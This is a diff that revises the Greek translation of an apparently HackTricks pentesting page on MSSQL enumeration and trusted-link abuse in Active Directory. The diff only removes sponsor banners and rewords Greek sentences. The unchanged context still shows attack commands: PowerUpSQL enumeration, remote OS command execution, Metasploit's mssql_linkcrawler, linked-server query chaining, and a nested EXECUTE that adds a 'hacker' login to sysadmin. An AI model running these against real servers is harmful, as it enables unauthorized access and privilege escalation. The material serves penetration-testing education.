@@ -2,9 +2,6 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://websec.nl/" %}
 
 ## **MSSQL Enumeration / Discovery**
 
@@ -111,7 +108,7 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 #The discovered MSSQL servers must be on the file: C:\temp\instances.txt
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
-### Απαρίθμηση από μέσα του τομέα
+### Αριθμητική από το εσωτερικό του τομέα
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -161,7 +158,7 @@ Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResu
 
 ## MSSQL Εμπιστευμένοι Σύνδεσμοι
 
-Εάν μια MSSQL παρουσία είναι εμπιστευμένη (σύνδεσμος βάσης δεδομένων) από μια διαφορετική MSSQL παρουσία. Εάν ο χρήστης έχει δικαιώματα πάνω στη εμπιστευμένη βάση δεδομένων, θα είναι σε θέση να **χρησιμοποιήσει τη σχέση εμπιστοσύνης για να εκτελέσει ερωτήματα και στην άλλη παρουσία**. Αυτές οι εμπιστοσύνες μπορούν να αλυσωθούν και σε κάποιο σημείο ο χρήστης μπορεί να είναι σε θέση να βρει κάποια κακώς ρυθμισμένη βάση δεδομένων όπου μπορεί να εκτελέσει εντολές.
+Εάν μια MSSQL παρουσία είναι εμπιστευτή (σύνδεσμος βάσης δεδομένων) από μια διαφορετική MSSQL παρουσία. Εάν ο χρήστης έχει δικαιώματα πάνω στη εμπιστευμένη βάση δεδομένων, θα είναι σε θέση να **χρησιμοποιήσει τη σχέση εμπιστοσύνης για να εκτελέσει ερωτήματα και στην άλλη παρουσία**. Αυτές οι εμπιστοσύνες μπορούν να αλυσωθούν και σε κάποιο σημείο ο χρήστης μπορεί να είναι σε θέση να βρει κάποια κακώς ρυθμισμένη βάση δεδομένων όπου μπορεί να εκτελέσει εντολές.
 
 **Οι σύνδεσμοι μεταξύ των βάσεων δεδομένων λειτουργούν ακόμη και σε διασυνδέσεις δασών.**
 
@@ -199,7 +196,7 @@ Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql
 ```
 ### Metasploit
 
-Μπορείτε να ελέγξετε εύκολα για αξιόπιστους συνδέσμους χρησιμοποιώντας το metasploit.
+Μπορείτε εύκολα να ελέγξετε για αξιόπιστους συνδέσμους χρησιμοποιώντας το metasploit.
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
@@ -226,7 +223,7 @@ EXEC sp_linkedservers;
 
 #### Εκτέλεση ερωτημάτων σε αξιόπιστο σύνδεσμο
 
-Εκτέλεση ερωτημάτων μέσω του συνδέσμου (παράδειγμα: βρείτε περισσότερους συνδέσμους στη νέα προσβάσιμη παρουσία):
+Εκτελέστε ερωτήματα μέσω του συνδέσμου (παράδειγμα: βρείτε περισσότερους συνδέσμους στη νέα προσβάσιμη παρουσία):
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
@@ -261,8 +258,5 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 [SweetPotato](https://github.com/CCob/SweetPotato) έχει μια συλλογή από αυτές τις διάφορες τεχνικές που μπορούν να εκτελούνται μέσω της εντολής `execute-assembly` του Beacon.
 
-<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://websec.nl/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
